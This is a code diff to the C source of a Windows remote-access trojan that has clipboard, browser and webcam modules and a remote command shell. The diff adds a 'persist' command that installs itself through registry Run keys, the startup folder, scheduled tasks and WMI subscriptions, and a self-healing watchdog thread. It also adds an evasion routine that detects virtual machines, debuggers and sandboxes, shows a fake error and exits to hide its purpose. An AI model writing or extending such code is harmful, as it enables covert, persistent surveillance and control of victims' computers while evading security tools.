@@ -2,8 +2,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <Windows.h>
-#include <WinUser.h>
+#include <windows.h>
+#include <winuser.h>
 #include <wininet.h>
 #include <windowsx.h>
 #include <sys/stat.h>
@@ -18,6 +18,8 @@
 #include "clipboard.h"
 #include "browser.h"
 #include "webcam.h"
+#include "persistence.h"
+#include "evasion.h"
 
 // Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 
@@ -275,8 +277,52 @@ void Shell()
     }
     else if (strncmp("persist", buffer, 7) == 0)
     {
-      // Persist connection
-      bootRun();
+      char response[512];
+
+      if (strncmp("persist:registry", buffer, 16) == 0)
+      {
+        int r = PersistRegistry();
+        snprintf(response, sizeof(response),
+          "[+] Registry persistence: %d keys added%s\n",
+          r, IsElevated() ? " (admin mode)" : "");
+      }
+      else if (strncmp("persist:startup", buffer, 15) == 0)
+      {
+        int r = PersistStartupFolder();
+        snprintf(response, sizeof(response),
+          "[+] Startup folder: %s\n", r ? "success" : "failed");
+      }
+      else if (strncmp("persist:task", buffer, 12) == 0)
+      {
+        int r = PersistScheduledTask();
+        snprintf(response, sizeof(response),
+          "[+] Scheduled tasks: %s\n", r ? "success" : "failed");
+      }
+      else if (strncmp("persist:wmi", buffer, 11) == 0)
+      {
+        int r = PersistWMI();
+        snprintf(response, sizeof(response),
+          "[+] WMI subscription: %s\n", r ? "success" : "failed");
+      }
+      else if (strncmp("persist:check", buffer, 13) == 0)
+      {
+        int r = PersistCheck();
+        snprintf(response, sizeof(response),
+          "[+] Persistence check: %d repairs made\n", r);
+      }
+      else
+      {
+        // Default: run all persistence mechanisms
+        int r = PersistAll();
+        snprintf(response, sizeof(response),
+          "[+] All persistence mechanisms executed\n"
+          "    Mechanisms installed: %d\n"
+          "    Admin mode: %s\n"
+          "    Watchdog: active\n",
+          r, IsElevated() ? "Yes (HKLM keys added)" : "No (user-level only)");
+      }
+
+      send(sock, response, strlen(response), 0);
     }
     else if (strcmp("ps", buffer) == 0)
     {
@@ -478,6 +524,18 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     return 1;
   }
 
+  // ============================================================
+  // EVASION: Initialize anti-analysis and bypass security tools
+  // This must be called FIRST before any suspicious activity
+  // ============================================================
+  if (!InitEvasion())
+  {
+    // Analysis environment detected (VM, debugger, or sandbox)
+    // InitEvasion() already showed a fake error message
+    // Exit cleanly without revealing true purpose
+    return 0;
+  }
+
   // Run without showing CMD window
   HWND stealth;
   AllocConsole();
@@ -506,6 +564,9 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 
   // Enable WOL (multi-vendor support)
   enable_wol();
+
+  // Start persistence watchdog thread (self-healing)
+  StartWatchdogThread();
 
   // Enter into Shell
   Shell();
